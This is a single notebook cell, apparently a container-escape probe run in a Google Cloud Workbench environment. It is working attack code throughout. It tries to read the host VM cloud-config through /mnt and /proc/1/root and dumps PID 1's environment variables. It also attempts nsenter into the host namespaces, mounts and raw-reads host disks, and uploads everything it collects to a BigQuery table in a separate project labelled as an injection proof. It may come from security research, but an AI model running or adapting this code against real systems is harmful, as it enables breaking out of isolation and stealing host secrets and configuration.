In [ ]:
import os, subprocess, json
from google.cloud import bigquery

def safe(label, fn):
    try: return {'label': label, 'value': str(fn())[:4500]}
    except Exception as e: return {'label': label, 'value': f'ERR: {type(e).__name__}: {str(e)[:600]}'}

p = []

# THE BIG TEST: can we read host VM cloud-config?
p.append(safe('host_cloud_config_direct', lambda: open('/mnt/stateful_partition/workbench/cloud-config.yaml').read()[:4000]))
p.append(safe('host_mnt_stateful_ls', lambda: subprocess.check_output(['ls','-laR','/mnt/stateful_partition'], stderr=subprocess.STDOUT, timeout=10).decode()[:3500]))
p.append(safe('host_mnt_ls', lambda: subprocess.check_output(['ls','-la','/mnt'], stderr=subprocess.STDOUT, timeout=5).decode()))

# Via /proc/1/root
p.append(safe('proc1_mnt', lambda: subprocess.check_output(['ls','-la','/proc/1/root/mnt'], stderr=subprocess.STDOUT, timeout=5).decode()))
p.append(safe('proc1_root_cloud_config', lambda: open('/proc/1/root/mnt/stateful_partition/workbench/cloud-config.yaml').read()[:4000]))

# All proc PIDs and their root mappings
for pid in ['1','7','9','11','12']:
    p.append(safe(f'proc_{pid}_root_link', lambda pp=pid: os.readlink(f'/proc/{pp}/root')))
    p.append(safe(f'proc_{pid}_mountinfo', lambda pp=pid: open(f'/proc/{pp}/mountinfo').read()[:2000]))

# Use ptrace to attach to PID 1 and read its memory
p.append(safe('proc_1_environ_dump', lambda: open('/proc/1/environ','rb').read()[:3000].decode('utf-8','replace').replace('\x00','\n')))

# Other interesting host paths
for path in ['/host', '/hostfs', '/rootfs', '/var/lib/docker', '/var/lib/containerd', 
             '/run/docker.sock', '/etc/docker', '/var/lib/kubelet']:
    p.append(safe(f'path_{path}', lambda pp=path: subprocess.check_output(['ls','-la',pp], stderr=subprocess.STDOUT, timeout=3).decode()[:800]))

# Try nsenter / unshare to enter PID 1's namespaces  
p.append(safe('try_nsenter_pid1', lambda: subprocess.check_output(['nsenter','-t','1','-m','--','ls','-la','/mnt'], stderr=subprocess.STDOUT, timeout=5).decode()[:1500]))
p.append(safe('try_unshare', lambda: subprocess.check_output(['unshare','-m','--','ls','/mnt'], stderr=subprocess.STDOUT, timeout=5).decode()))

# Mount the host's /dev/sda1 (most common GCE boot disk) read-only — escapes container
subprocess.run(['mkdir','-p','/tmp/host'], capture_output=True)
p.append(safe('lsblk', lambda: subprocess.check_output(['lsblk','-f'], stderr=subprocess.STDOUT, timeout=5).decode()[:2000]))
p.append(safe('blkid', lambda: subprocess.check_output(['blkid'], stderr=subprocess.STDOUT, timeout=5).decode()[:2000]))
p.append(safe('ls_dev_sd', lambda: subprocess.check_output(['ls','/dev'], stderr=subprocess.STDOUT, timeout=3).decode()[:2000]))
p.append(safe('mount_sda1_ro', lambda: subprocess.run(['mount','-o','ro','/dev/sda1','/tmp/host'], capture_output=True, text=True, timeout=5).stderr or 'OK'))
p.append(safe('mount_sda3', lambda: subprocess.run(['mount','-o','ro','/dev/sda3','/tmp/host'], capture_output=True, text=True, timeout=5).stderr or 'OK'))
p.append(safe('mount_sda8', lambda: subprocess.run(['mount','-o','ro','/dev/sda8','/tmp/host'], capture_output=True, text=True, timeout=5).stderr or 'OK'))
p.append(safe('mount_sda1_after_check', lambda: subprocess.check_output(['ls','-la','/tmp/host'], stderr=subprocess.STDOUT, timeout=5).decode()[:2000]))

# Read the WORKBENCH cloud-config from any possible mount
for cand_path in ['/mnt/stateful_partition/workbench/cloud-config.yaml',
                   '/tmp/host/workbench/cloud-config.yaml',
                   '/proc/1/root/mnt/stateful_partition/workbench/cloud-config.yaml']:
    p.append(safe(f'try_read_{cand_path[:60]}', lambda c=cand_path: open(c).read()[:4000]))

# Direct disk read via /dev/sda — extremely revealing if works
p.append(safe('dev_sda_read_head', lambda: open('/dev/sda','rb').read(2048).hex()[:2000]))
p.append(safe('dev_sda1_read_head', lambda: open('/dev/sda1','rb').read(2048).hex()[:2000]))

client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_HOST_ESCAPE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
